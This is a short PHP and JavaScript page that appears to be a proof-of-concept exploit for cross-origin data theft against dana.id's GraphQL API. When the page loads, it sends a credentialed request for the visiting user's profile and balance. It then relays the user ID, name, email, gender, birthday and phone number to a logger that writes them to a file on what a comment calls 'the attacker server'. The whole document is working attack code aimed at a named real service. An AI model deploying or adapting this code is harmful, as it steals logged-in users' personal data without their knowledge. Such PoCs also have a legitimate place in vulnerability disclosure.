<?php

$log = "loguser.txt";

if(!file_exists($log)){
	touch($log);
}else{
	$fp = fopen($log, "a+");
}

if(!empty($_GET)){
	$id = $_GET['id'];
	$name = $_GET['name'];
	$email = $_GET['email'];
	$gender = $_GET['gender'];
	$bday = $_GET['bday'];
	$phone = $_GET['phone'];

	fwrite($fp, "ID : {$id} | Name : {$name} | Email : {$email} | Gender : {$gender} | Birthday : {$bday} | Phone : {$phone}\r\n");
	fclose($fp);
}
?>

<!doctype html>
<body>
<div id="hasil"></div>
<script>
var h = document.getElementById("hasil");

function logger(a,b,c,d,e,f){
	var log = new XMLHttpRequest();
	log.onreadystatechange = function(){
		if(this.status == 200 || this.readyState == 4){
			console.log('Success !!');
		}
	}
	log.open("GET", "<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES); ?>?id="+a+"&name="+b+"&email="+c+"&gender="+d+"&bday="+e+"&phone="+f);
	log.send();
}

function sendRequest(){
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function(){
		if(this.status == 200 || this.readyState == 4){
			h.innerText = this.responseText;

			var o = JSON.parse(this.responseText);
			var p = o.data.profile;
			logger(p.user_id, p.full_name, p.email, p.gender, p.bday, p.phone); //save to the attacker server
		}
	}
	xhr.open("POST", "https://www.dana.id/graphql", false);
	xhr.withCredentials = true;
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.setRequestHeader("Accept", "application/json");
	xhr.send(JSON.stringify({"variables":{},"extensions":{},"operationName":"ProfileDataQuery","query":"query ProfileDataQuery {\n  profile {\n    user_id\n    full_name\n    email\n    gender\n    bday\n    age\n    phone\n    phone_masked\n    phone_verified\n    profile_picture\n    created_password\n    __typename\n  }\n  saldo {\n    deposit_fmt\n    __typename\n  }\n}\n"}));
}
window.onload = sendRequest();
</script>
</body>
</html>